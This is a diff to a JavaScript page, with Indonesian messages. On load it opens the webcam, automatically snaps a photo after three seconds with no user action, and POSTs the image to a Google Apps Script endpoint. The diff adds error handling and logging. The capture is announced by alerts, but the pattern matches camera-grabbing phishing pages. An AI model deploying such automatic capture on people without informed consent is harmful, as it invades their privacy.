@@ -13,7 +13,7 @@
 
 const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbyDcJPqlwfkGxPBLcAd-0bMFpj9m4FeEWFetBpyl5g3K7wF4SU1HQzM3cCUWUh_JI1rcQ/exec";
 
-window.onload = async function() {
+window.onload = async function () {
 
   try {
 
@@ -26,37 +26,59 @@ window.onload = async function() {
     const video = document.getElementById("video");
     video.srcObject = stream;
 
-    video.addEventListener("playing", () => {
+    video.onloadedmetadata = function () {
 
       setTimeout(async () => {
 
-        const canvas = document.getElementById("canvas");
+        try {
 
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+          const canvas = document.getElementById("canvas");
 
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0);
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
 
-        const image = canvas.toDataURL("image/jpeg", 0.9);
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0);
 
-        await fetch(WEBAPP_URL, {
-          method: "POST",
-          body: JSON.stringify({
-            image: image
-          })
-        });
+          const image = canvas.toDataURL("image/jpeg", 0.9);
 
-        alert("Foto berhasil disimpan");
+          console.log("Foto berhasil dibuat");
+          console.log(image.substring(0, 50));
 
-        stream.getTracks().forEach(track => track.stop());
+          const response = await fetch(WEBAPP_URL, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              image: image
+            })
+          });
+
+          const result = await response.text();
+
+          console.log("Response Apps Script:", result);
+
+          alert("Foto berhasil disimpan");
+
+          stream.getTracks().forEach(track => track.stop());
+
+        } catch (err) {
+
+          console.error(err);
+          alert("Gagal upload: " + err.message);
+
+        }
 
       }, 3000);
 
-    });
+    };
 
-  } catch(err) {
-    alert(err.message);
+  } catch (err) {
+
+    console.error(err);
+    alert("Error Kamera: " + err.message);
+
   }
 
 };
